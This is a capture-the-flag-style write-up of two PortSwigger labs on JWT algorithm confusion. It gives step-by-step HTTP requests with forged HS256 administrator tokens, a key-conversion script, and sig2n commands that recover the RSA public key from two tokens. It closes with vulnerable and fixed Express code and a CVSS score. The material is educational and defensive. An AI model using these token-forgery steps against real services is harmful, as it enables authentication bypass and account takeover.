# Article 4: Algorithm Confusion Attacks

> This is **Article 4 of 4** in a series of articles about JWT vulnerabilities, based on labs from [PortSwigger Web Security Academy](https://portswigger.net/web-security/jwt).

**Labs covered:**
- Lab 7: JWT authentication bypass via algorithm confusion
- Lab 8: JWT authentication bypass via algorithm confusion (no exposed key)

---

## About this article

In the previous articles, the server either failed to verify signatures, used weak secrets, or trusted attacker-controlled keys in the header. This time, the server uses a **robust RSA key pair** and verifies signatures properly — but the way it selects the **algorithm** is flawed. This allows an **algorithm confusion** (also known as **key confusion**) attack.

---

## 1. Algorithm Confusion: Theory

### 1.1 Symmetric vs Asymmetric Algorithms

JWTs can be signed using different algorithms:

| Algorithm | Type | Key usage |
|---|---|---|
| **HS256** (HMAC + SHA-256) | **Symmetric** | A single secret key is used to **both sign and verify** — must be kept secret |
| **RS256** (RSA + SHA-256) | **Asymmetric** | A **private key** signs; a mathematically related **public key** verifies |

In asymmetric signing:
- The **private key** stays secret (only the server has it).
- The **public key** is often shared so anyone can verify the server's signatures.

### 1.2 How Algorithm Confusion Arises

Many JWT libraries provide a single, **algorithm-agnostic** `verify()` method. It reads the `alg` parameter from the token header and decides which verification to perform:

```js
function verify(token, secretOrPublicKey) {
  const algorithm = token.getAlgHeader();

  if (algorithm == "RS256") {
    // Use the provided key as an RSA public key
  } else if (algorithm == "HS256") {
    // Use the provided key as an HMAC secret key
  }
}
```

Developers who use this method often assume it will **only handle RS256 tokens**. Because of this flawed assumption, they always pass a **fixed public key**:

```js
const publicKey = <server-public-key>;
const token = request.cookies.session;
verify(token, publicKey);
```

**The flaw:** if the server receives a token signed with a **symmetric** algorithm (HS256), the library treats the **public key as an HMAC secret**. An attacker can sign a token with HS256 using the **public key** as the secret — and the server will verify it with the same public key. Result: valid forged token.

> **Important:** The public key used to sign must be **byte-for-byte identical** to the server's key — including the same format (e.g., X.509 PEM) and all non-printing characters (newlines).

---

## 2. Lab 7: JWT authentication bypass via algorithm confusion

### 2.1 Lab Description

> This lab uses a JWT-based mechanism for handling sessions. It uses a robust RSA key pair to sign and verify tokens. However, due to implementation flaws, this mechanism is vulnerable to **algorithm confusion** attacks.
>
> **Goal:** Obtain the server's public key (exposed via a standard endpoint), use it to sign a modified session token, gain access to `/admin`, then delete the user `carlos`.
>
> **Credentials:** `wiener:peter`

### 2.2 Exploitation Walkthrough

#### Step 1 — Obtain a valid session token

Log in with `wiener:peter` and capture the JWT session cookie.

```http
GET /my-account?id=wiener HTTP/1.1
Host: 0acf006604fe69308177201e00be0051.web-security-academy.net
Connection: keep-alive
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
sec-ch-ua: "Not;A=Brand";v="8", "Chromium";v="150"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Referer: https://0acf006604fe69308177201e00be0051.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: en-US,en;q=0.9
Cookie: session=eyJraWQiOiJmZDZkZGFlOC03OTM4LTQ4ZTUtODY2Yy0yOGQ2MjQ2ZjFlOTIiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4ODk1MzU5NCwic3ViIjoid2llbmVyIn0.ZBpcEROOnajOKto0g7SSj04cm5sh3Qbuz_I_VZm5g-3AKhQF_kWM9QNowAH8WjwNn67W6dYc8BXC_WEtpuORbhSvSHl8U0dmu_9PqFwCKjXfEVxvdrKqts4TstUK0198Q0Cc3N2uPT_7AfXFQOrHwqFpsVNdsxLvC6QMCAhvsfoWAojeRPfDxY3njGL-5g3wZb8cfkdIrzFImhgNT68CxW0h3V1SxVoOfpjM1j_4P38pk1jYoAbaLU-Khs-JjQ2OITBLIZURtk9rqIwgqsyA0M_cI70xvCGHX0vSfj4RlkStDnHjQVjxd6Ll9jOe1mOOogwIksAa0J81D-vfYh_5Wg


```

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Cache-Control: no-cache
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 3468
```

The captured token:

```
eyJraWQiOiJmZDZkZGFlOC03OTM4LTQ4ZTUtODY2Yy0yOGQ2MjQ2ZjFlOTIiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4ODk1MzU5NCwic3ViIjoid2llbmVyIn0.ZBpcEROOnajOKto0g7SSj04cm5sh3Qbuz_I_VZm5g-3AKhQF_kWM9QNowAH8WjwNn67W6dYc8BXC_WEtpuORbhSvSHl8U0dmu_9PqFwCKjXfEVxvdrKqts4TstUK0198Q0Cc3N2uPT_7AfXFQOrHwqFpsVNdsxLvC6QMCAhvsfoWAojeRPfDxY3njGL-5g3wZb8cfkdIrzFImhgNT68CxW0h3V1SxVoOfpjM1j_4P38pk1jYoAbaLU-Khs-JjQ2OITBLIZURtk9rqIwgqsyA0M_cI70xvCGHX0vSfj4RlkStDnHjQVjxd6Ll9jOe1mOOogwIksAa0J81D-vfYh_5Wg
```

![[Articles/JWT Articles/Article 4/lab 7/Screenshot_20260927_153904.png]]

#### Step 2 — Obtain the server's public key

The public key is exposed via a standard endpoint:

```http
GET /jwks.json HTTP/1.1
Host: 0acf006604fe69308177201e00be0051.web-security-academy.net
```

Response — a JWK Set:

```json
{
    "keys": [{
        "kty": "RSA",
        "e": "AQAB",
        "use": "sig",
        "kid": "fd6ddae8-7938-48e5-866c-28d6246f1e92",
        "alg": "RS256",
        "n": "tw1K4wAXWalbU_EPufQgoDwQ3_8YDhjl5MOZ-WYDi20gMuIOQJVufaz7l_MwZshlOZAUndSLFl2ayfBN2DiOmBj8mg7Dz6QSI7KFhhh89NCjyatR8QdFJlxdSpE2fk4T1jfi7uOMpQmVIyr25qu0RqJLieRm0CMi6EHYV4R4D1EjqKFS9ngnHzQuzdKCmC3sdEDEyv-WeGA5fEpgK6G8_CUnYYGMOdnckS-Vzp023drmcgsgYov3sFxBBxncYgIreqW6IpBXOGgfCyErMzeCzNBOE_gg6_YvuMqsbEx-d7hwRr5UpCLq_fD6LjhWubQB65pfqPq8Iwlji_rW2PGeKQ"
    }]
}
```

#### Step 3 — Convert the public key to X.509 PEM

The JWK is in JSON format, but the server verifies using its own copy of the key — typically **X.509 PEM**. Convert the JWK to PEM (using a [converter tool](`https://wwtools.dev/tools/pem-jwk-converter`) or the script below).

Converted PEM key:

```
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtw1K4wAXWalbU/EPufQg
oDwQ3/8YDhjl5MOZ+WYDi20gMuIOQJVufaz7l/MwZshlOZAUndSLFl2ayfBN2DiO
mBj8mg7Dz6QSI7KFhhh89NCjyatR8QdFJlxdSpE2fk4T1jfi7uOMpQmVIyr25qu0
RqJLieRm0CMi6EHYV4R4D1EjqKFS9ngnHzQuzdKCmC3sdEDEyv+WeGA5fEpgK6G8
/CUnYYGMOdnckS+Vzp023drmcgsgYov3sFxBBxncYgIreqW6IpBXOGgfCyErMzeC
zNBOE/gg6/YvuMqsbEx+d7hwRr5UpCLq/fD6LjhWubQB65pfqPq8Iwlji/rW2PGe
KQIDAQAB
-----END PUBLIC KEY-----
```

![[Articles/JWT Articles/Article 4/lab 7/Screenshot_20260909_064521.png]]

> **Note:** To reconstruct the public key from JWK, you need both `n` (modulus) and `e` (exponent). Together they fully describe the RSA public key. From them, you build the ASN.1 structure → DER → base64 → PEM.

```python
import base64
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization

# 1. n and e from JWK
n = int.from_bytes(base64.urlsafe_b64decode(jwk["n"] + "=="), "big")
e = int.from_bytes(base64.urlsafe_b64decode(jwk["e"] + "=="), "big")

# 2. Build the public key object
pub = rsa.RSAPublicNumbers(e, n).public_key()

# 3. Serialize to X.509 PEM (SPKI)
pem = pub.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
)
```

#### Step 4 — Sign a modified token with HS256 using the public key as the secret

Change the `alg` header to `HS256`, set `sub: administrator`, and sign using the **PEM public key** as the HMAC secret (this is the whole point of algorithm confusion).

![[Articles/JWT Articles/Article 4/lab 7/Screenshot_20260909_065108.png]]

Forged token:

```
eyJraWQiOiJmZDZkZGFlOC03OTM4LTQ4ZTUtODY2Yy0yOGQ2MjQ2ZjFlOTIiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4ODk1MzU5NCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.6pJQX_Y1ZB0lpPFn2NQSux23IqjlXzU1A2rhVHQ3rTk
```

![[Articles/JWT Articles/Article 4/lab 7/Screenshot_20260909_065146.png]]

#### Step 5 — Access `/admin`

```http
GET /admin HTTP/1.1
Host: 0acf006604fe69308177201e00be0051.web-security-academy.net
Cookie: session=eyJraWQiOiJmZDZkZGFlOC03OTM4LTQ4ZTUtODY2Yy0yOGQ2MjQ2ZjFlOTIiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4ODk1MzU5NCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.6pJQX_Y1ZB0lpPFn2NQSux23IqjlXzU1A2rhVHQ3rTk
```

**Response — 200 OK, admin access granted:**

```http
HTTP/1.1 200 OK
Content-Length: 3259
```

![[Articles/JWT Articles/Article 4/lab 7/Screenshot_20260909_065415.png]]

#### Step 6 — Delete the user `carlos`

```http
GET /admin/delete?username=carlos HTTP/1.1
Host: 0acf006604fe69308177201e00be0051.web-security-academy.net
Cookie: session=<forged_token>
```

**Response — 302 → 200, lab solved.**

![[Articles/JWT Articles/Article 4/lab 7/Screenshot_20260909_065550.png]]

### 2.3 Vulnerable Node.js Express Code

```js
const jwt = require('jsonwebtoken');
const express = require('express');
const app = express();

const SERVER_PUBLIC_KEY = `-----BEGIN PUBLIC KEY-----
...server public key...
-----END PUBLIC KEY-----`;

app.get('/admin', (req, res) => {
  const token = req.cookies.session;

  // BUG: the algorithm is taken from the token header (user-controlled),
  // and NO whitelist is enforced. If alg is set to HS256, the public key
  // is used as an HMAC secret — which the attacker knows.
  const decoded = jwt.verify(token, SERVER_PUBLIC_KEY, {
    algorithms: ['RS256', 'HS256']   // HS256 must not be allowed
  });

  if (decoded.sub === 'administrator') {
    res.send('Admin panel');
  } else {
    res.send('Forbidden');
  }
});
```

**Why it's vulnerable:** the library picks the algorithm from the `alg` header. Because `HS256` is allowed, the attacker can sign with the public key as an HMAC secret, and the server verifies with the same public key — valid.

### 2.4 Fix

```js
app.get('/admin', (req, res) => {
  const token = req.cookies.session;
  // Only allow asymmetric algorithms — never symmetric for a public key
  const decoded = jwt.verify(token, SERVER_PUBLIC_KEY, {
    algorithms: ['RS256']
  });

  if (decoded.sub === 'administrator') {
    res.send('Admin panel');
  } else {
    res.send('Forbidden');
  }
});
```

---

## 3. Lab 8: JWT authentication bypass via algorithm confusion (no exposed key)

### 3.1 Lab Description

> This lab uses a JWT-based mechanism for handling sessions. It uses a robust RSA key pair to sign and verify tokens. However, due to implementation flaws, this mechanism is vulnerable to **algorithm confusion** attacks.
>
> **Goal:** Obtain the server's public key, use it to sign a modified session token, gain access to `/admin`, then delete the user `carlos`.
>
> **Credentials:** `wiener:peter`
>
> **Key difference from Lab 7:** the public key is **not exposed** via a standard endpoint. It must be **derived** from a pair of existing JWTs.

### 3.2 Theory: Deriving the Public Key

When the public key isn't exposed, you can still derive it from **two JWTs signed with the same private key**. For RSA:

```
s = m^d mod n        (signature)
s^e ≡ m (mod n)      →  s^e − m is a multiple of n
```

For two signatures:

```
gcd(s1^e − m1, s2^e − m2) = n
```

This recovers the modulus `n`, and with `e = 65537`, the full public key. Tools like [`rsa_sign2n`](https://github.com/silentsignal/rsa_sign2n) automate this. PortSwigger provides a Dockerized version:

```sh
docker run --rm -it portswigger/sig2n <token1> <token2>
```

> The tool may output **multiple potential keys** (due to modulus ambiguity). Only **one** matches the server's key.

### 3.3 Exploitation Walkthrough

#### Step 1 — Obtain two valid session tokens

Log in with `wiener:peter` **twice** (log in and log out) to get **two different JWTs** signed with the same private key.

```http
GET /my-account?id=wiener HTTP/1.1
Host: 0a0000fc043333b98201479500580046.web-security-academy.net
Connection: keep-alive
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
sec-ch-ua: "Not;A=Brand";v="8", "Chromium";v="150"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Referer: https://0a0000fc043333b98201479500580046.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: en-US,en;q=0.9
Cookie: session=eyJraWQiOiJiZjExYzlmMC1jZGQ1LTQ3MWQtYWZjOC03MDQxNjI2ZjM2ZjAiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4ODk  
2NTk0Nywic3ViIjoid2llbmVyIn0.JN3okMZP3ucn-hFAI-cfU1HeiQYryrB_iQV6TteyO-6qmXgDV6ThqNLZf00s_WfuPK7W31YJQyqEjzWu7A_1mNoVPqoUxLsLjFWkjxMzDOZfapHFAtoAn-20G5a18xiKOFZvkFwBa  
lzizk3cRNbV7zaowVMjZO_hVXt6xDf-8P_4aYz_nJtZqJfFmfdW02sda7hssbLCpO1GlLKl9IOwODc3NSYVXTvv9D2KjU6w_E0zEua5_yk8Gzxkzpp4Z_PJidc8bxTrSa4om9SFID9UrttolyFBJ9tldjhypewPxORPt9T  
eBs-7iu06KWkqi9M9IJBdNxkd3d6-Mp0vXY4jZQ
```

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Cache-Control: no-cache
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 3528
```

First token:

```
eyJraWQiOiJiZjExYzlmMC1jZGQ1LTQ3MWQtYWZjOC03MDQxNjI2ZjM2ZjAiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4ODk2NTk0Nywic3ViIjoid2llbmVyIn0.JN3okMZP3ucn-hFAI-cfU1HeiQYryrB_iQV6TteyO-6qmXgDV6ThqNLZf00s_WfuPK7W31YJQyqEjzWu7A_1mNoVPqoUxLsLjFWkjxMzDOZfapHFAtoAn-20G5a18xiKOFZvkFwBalzizk3cRNbV7zaowVMjZO_hVXt6xDf-8P_4aYz_nJtZqJfFmfdW02sda7hssbLCpO1GlLKl9IOwODc3NSYVXTvv9D2KjU6w_E0zEua5_yk8Gzxkzpp4Z_PJidc8bxTrSa4om9SFID9UrttolyFBJ9tldjhypewPxORPt9TeBs-7iu06KWkqi9M9IJBdNxkd3d6-Mp0vXY4jZQ
```

Second token:

```
eyJraWQiOiJiZjExYzlmMC1jZGQ1LTQ3MWQtYWZjOC03MDQxNjI2ZjM2ZjAiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4ODk2NjAwMCwic3ViIjoid2llbmVyIn0.gMMIuWBmBttC8XZl2oUjlVmhfIjnNemaEyA8u7V0-mx1c_bIHK9aTB1r4Wmcv9Hq6Q-uhZOvwKObRg-a7B9F3_3deAmL9seO7MxLQm2wDbEzzEngt23XJVsZCSiyujjWD97U1HfGqf3I2x5TYiL75pnm28JRQtdbBM_ocp9fey7lmRWNl8l8OCBbU7qPawhE8TdIz9ctjqjejuo_9VlQ6Kqkjh62J6FA9sKkg7-MHzevJEc4Mr_xeUU4B_NGQMoszzThsVOXc1fvSF2E0N9nsgsqzFBo9o-GY2hBWeLEUun2oEkiBgQaQkRaPorICpc3qjW98Oo-HKfZuekfd7GjOA
```

#### Step 2 — Run sig2n to derive the public key

```sh
docker run --rm -it portswigger/sig2n <token1> <token2>
```

The tool outputs several candidate public keys (in both X.509 and PKCS1 PEM formats) plus forged JWTs for each.

```sh
docker run --rm -it portswigger/sig2n eyJraWQiOiJiZjExYzlmMC1jZGQ1LTQ3MWQtYWZjOC03MDQxNjI2ZjM2ZjAiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4ODk  
2NTk0Nywic3ViIjoid2llbmVyIn0.JN3okMZP3ucn-hFAI-cfU1HeiQYryrB_iQV6TteyO-6qmXgDV6ThqNLZf00s_WfuPK7W31YJQyqEjzWu7A_1mNoVPqoUxLsLjFWkjxMzDOZfapHFAtoAn-20G5a18xiKOFZvkFwBa  
lzizk3cRNbV7zaowVMjZO_hVXt6xDf-8P_4aYz_nJtZqJfFmfdW02sda7hssbLCpO1GlLKl9IOwODc3NSYVXTvv9D2KjU6w_E0zEua5_yk8Gzxkzpp4Z_PJidc8bxTrSa4om9SFID9UrttolyFBJ9tldjhypewPxORPt9T  
eBs-7iu06KWkqi9M9IJBdNxkd3d6-Mp0vXY4jZQ eyJraWQiOiJiZjExYzlmMC1jZGQ1LTQ3MWQtYWZjOC03MDQxNjI2ZjM2ZjAiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4ODk2N  
jAwMCwic3ViIjoid2llbmVyIn0.gMMIuWBmBttC8XZl2oUjlVmhfIjnNemaEyA8u7V0-mx1c_bIHK9aTB1r4Wmcv9Hq6Q-uhZOvwKObRg-a7B9F3_3deAmL9seO7MxLQm2wDbEzzEngt23XJVsZCSiyujjWD97U1HfGqf3  
I2x5TYiL75pnm28JRQtdbBM_ocp9fey7lmRWNl8l8OCBbU7qPawhE8TdIz9ctjqjejuo_9VlQ6Kqkjh62J6FA9sKkg7-MHzevJEc4Mr_xeUU4B_NGQMoszzThsVOXc1fvSF2E0N9nsgsqzFBo9o-GY2hBWeLEUun2oEkiB  
gQaQkRaPorICpc3qjW98Oo-HKfZuekfd7GjOA  
Running command: python3 jwt_forgery.py <token1> <token2>  
  
Found n with multiplier 1:  
   Base64 encoded x509 key: LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFuUlNlYzNjaW5VSjhJd1FZbkZ1WgorWWdtaDY4SkE0R  
EFvUVBNMnVJdmp1K0ZkcTBUNGY4a3AvVE55cGE4VGx2c2dXRjUxL0tDdGt4Qk4zT0FuTVZ3CmU1bjFGZGMrUGlwT09tMExTZkNscUVBbjZqUFVYUkp0WENRa0xmTUtCd2Q0ZHFBQS9ldDU4V3ExR2tlbzN1YzYKWTZjcmV  
OanBjcWltekpSd2dhMUljaDhDaW1ac3Q3Zy9oRWV4cEk1R0Z4SlFoUFhScEpzYmk3WHhnTmhtV3B5YwpHTVFaNENyZDlvMHNIUEQrc3dXT2oyem1hUnQrNlFHY25UV1dEOEo2UDF1SkExaXBQRkJTc2U3djNPTDdoMnprC  
jlyV1BPdkFralQ2VnNnRGVuZytpbm1kZU5mWlFBN09oL2laZHdCdjc5N2xKaXIxR2x1RktOYnlSKzFrcVdyTEwKOHdJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg==  
   Tampered JWT: eyJraWQiOiJiZjExYzlmMC1jZGQ1LTQ3MWQtYWZjOC03MDQxNjI2ZjM2ZjAiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAicG9ydHN3aWdnZXIiLCAiZXhwIjogMTc4OTA0ODkzMCwgInN1YiI6ICJ  
3aWVuZXIifQ.vXdRHgC8tIIsanBksIdszZjv5CINFNpshkPZirhb46I  
   Base64 encoded pkcs1 key: LS0tLS1CRUdJTiBSU0EgUFVCTElDIEtFWS0tLS0tCk1JSUJDZ0tDQVFFQW5SU2VjM2NpblVKOEl3UVluRnVaK1lnbWg2OEpBNERBb1FQTTJ1SXZqdStGZHEwVDRmOGsKcC9UTnlw  
YThUbHZzZ1dGNTEvS0N0a3hCTjNPQW5NVndlNW4xRmRjK1BpcE9PbTBMU2ZDbHFFQW42alBVWFJKdApYQ1FrTGZNS0J3ZDRkcUFBL2V0NThXcTFHa2VvM3VjNlk2Y3JlTmpwY3FpbXpKUndnYTFJY2g4Q2ltWnN0N2cvCm  
hFZXhwSTVHRnhKUWhQWFJwSnNiaTdYeGdOaG1XcHljR01RWjRDcmQ5bzBzSFBEK3N3V09qMnptYVJ0KzZRR2MKblRXV0Q4SjZQMXVKQTFpcFBGQlNzZTd2M09MN2gyems5cldQT3ZBa2pUNlZzZ0RlbmcraW5tZGVOZlpR  
QTdPaAovaVpkd0J2Nzk3bEppcjFHbHVGS05ieVIrMWtxV3JMTDh3SURBUUFCCi0tLS0tRU5EIFJTQSBQVUJMSUMgS0VZLS0tLS0K  
   Tampered JWT: eyJraWQiOiJiZjExYzlmMC1jZGQ1LTQ3MWQtYWZjOC03MDQxNjI2ZjM2ZjAiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAicG9ydHN3aWdnZXIiLCAiZXhwIjogMTc4OTA0ODkzMCwgInN1YiI6ICJ  
3aWVuZXIifQ.G8DX5qil4dWuV7kk_c3xxmwfUcxSGvIhbRDbVT1ZgLY
```

#### Step 3 — Decode the candidate PEM key

The output includes a Base64-encoded X.509 key. Decode it:

```sh
echo '<base64-key>' | base64 -d
```

Resulting PEM:

```
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAnRSec3cinUJ8IwQYnFuZ
+Ygmh68JA4DAoQPM2uIvju+Fdq0T4f8kp/TNypa8TlvsgWF51/KCtkxBN3OAnMVw
e5n1Fdc+PipOOm0LSfClqEAn6jPUXRJtXCQkLfMKBwd4dqAA/et58Wq1Gkeo3uc6
Y6creNjpcqimzJRwga1Ich8CimZst7g/hEexpI5GFxJQhPXRpJsbi7XxgNhmWpyc
GMQZ4Crd9o0sHPD+swWOj2zmaRt+6QGcnTWWD8J6P1uJA1ipPFBSse7v3OL7h2zk
9rWPOvAkjT6VsgDeng+inmdeNfZQA7Oh/iZdwBv797lJir1GluFKNbyR+1kqWrLL
8wIDAQAB
-----END PUBLIC KEY-----
```

#### Step 4 — Forge the token with HS256

Use the derived public key as the HMAC secret, set `alg: HS256`, `sub: administrator`:

```
eyJraWQiOiJiZjExYzlmMC1jZGQ1LTQ3MWQtYWZjOC03MDQxNjI2ZjM2ZjAiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4ODk2NjAwMCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.Lq2T1jvp6YvGjBrD2NnLEbif57CLH5S3MhWZYow0xjI
```

![[Articles/JWT Articles/Article 4/lab 8/Screenshot_20260909_101807.png]]

#### Step 5 — Use the forged token to access the `/admin` panel

![[Articles/JWT Articles/Article 4/lab 8/Screenshot_20260909_101905.png]]
#### Step 6 — Delete the user `carlos`

```http
GET /admin/delete?username=carlos HTTP/1.1
Host: 0a7e005b036b5b8e81dd397a0028008b.web-security-academy.net
Cookie: session=eyJraWQiOiJiZjExYzlmMC1jZGQ1LTQ3MWQtYWZjOC03MDQxNjI2ZjM2ZjAiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4ODk2NjAwMCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.Lq2T1jvp6YvGjBrD2NnLEbif57CLH5S3MhWZYow0xjI
```

**Response — 302 → 200, lab solved.**

![[Articles/JWT Articles/Article 4/lab 8/Screenshot_20260909_102042.png]]

### 3.4 Vulnerable Node.js Express Code

```js
const jwt = require('jsonwebtoken');
const express = require('express');
const app = express();

const SERVER_PUBLIC_KEY = `-----BEGIN PUBLIC KEY-----
...server public key...
-----END PUBLIC KEY-----`;

app.get('/admin', (req, res) => {
  const token = req.cookies.session;

  // BUG: no algorithm whitelist. The library picks the algorithm
  // from the token header, so HS256 is accepted with the public key
  // used as an HMAC secret.
  const decoded = jwt.verify(token, SERVER_PUBLIC_KEY);   // no algorithms list

  if (decoded.sub === 'administrator') {
    res.send('Admin panel');
  } else {
    res.send('Forbidden');
  }
});
```

**Why it's vulnerable:** `jwt.verify()` without an explicit `algorithms` whitelist trusts the `alg` header. Even though the attacker had to derive the key (Lab 8), once recovered, the confusion attack works identically.

### 3.5 Fix

```js
app.get('/admin', (req, res) => {
  const token = req.cookies.session;
  // Explicit whitelist — only RS256 (asymmetric) is allowed
  const decoded = jwt.verify(token, SERVER_PUBLIC_KEY, {
    algorithms: ['RS256']
  });

  if (decoded.sub === 'administrator') {
    res.send('Admin panel');
  } else {
    res.send('Forbidden');
  }
});
```

---

## 4. CVSS Score

The vulnerability is an **authentication bypass** via algorithm confusion, leading to privilege escalation and account takeover.

### CVSS v3.1 Vector

```
CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
```

| Metric | Value | Explanation |
|---|---|---|
| **AV** | Network (N) | Exploited remotely over HTTP |
| **AC** | Low (L) | Requires only a valid JWT and the server's public key |
| **PR** | Low (L) | Needs a low-privileged account (`wiener`) |
| **UI** | None (N) | No user interaction required |
| **S** | Unchanged (U) | Impact stays within the affected component |
| **C / I / A** | High (H) | Full admin takeover, privilege escalation |

**Base Score: 8.8 (High)**

### Explanation

The attacker can forge a valid admin token because the server reuses the public key as an HMAC secret when HS256 is allowed. With a low-privileged session available and full admin impact, the score is **8.8 High**.

---

## 5. Key Takeaways

| #   | Lesson                                                                                                   |
| --- | -------------------------------------------------------------------------------------------------------- |
| 1   | Always enforce an explicit **algorithm whitelist** in `jwt.verify()`                                     |
| 2   | Never allow symmetric algorithms (HS256) when using asymmetric keys (RS256)                              |
| 3   | The public key must stay **public-only** — if used as an HMAC secret, the whole mechanism is compromised |
| 4   | Even if the key isn't exposed, it can be **derived** from two tokens (`sig2n`)                           |
| 5   | The key used for signing must be **byte-identical** to the server's (same format, same newlines)         |

---

*Article 4 of 4. Covers algorithm confusion (key confusion) attacks.*